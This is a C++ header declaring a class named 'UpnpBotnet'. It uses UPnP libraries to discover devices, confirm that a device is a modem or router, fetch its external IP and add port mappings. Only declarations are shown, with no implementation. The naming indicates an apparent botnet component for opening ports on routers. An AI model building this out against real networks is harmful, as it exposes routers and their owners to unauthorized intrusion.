#ifndef UPNP_HPP
    #define UPNP_HPP

#include <libupnpp/control/description.hxx>
#include <npupnp/upnp.h>
#include <npupnp/upnpdebug.h>
#include <npupnp/upnptools.h>

#include <iostream>
#include <string>
#include <set>
#include <mutex>
#include <condition_variable>
#include <string>
#include <thread>

#define UPNP_PORT   49152

class UpnpBotnet {
private:
    int _success;
    const char *_ifname;
    
    std::mutex locations_mutex;

    UpnpClient_Handle _hdl;
    std::string _service_ctlurl = "";
    std::string _service_evturl = "";
    std::string _service_type = "";

public:
    void InitLogs();
    void RegisterClient();
    void SearchAsync();
    void CheckErrorAndExit(const std::string errMessage);
    bool CheckErrorAndContinue(const std::string errMessage);

    const std::vector<std::pair<std::string, std::string>>
        runaction(UpnpClient_Handle _hdl, const std::string& action_name,
        const std::vector<std::pair<std::string, std::string>>& args);

    void Loop();
    void ScrapDevices();
    void VerifyDeviceIsModemRouter(UPnPClient::UPnPDeviceDesc desc);
    const std::vector<std::pair<std::string, std::string>> GetExternalIPAddress();
    void Subscribe();
    void AddPortMapping();

    UpnpBotnet(const char *ifname);
    ~UpnpBotnet();
};

#endif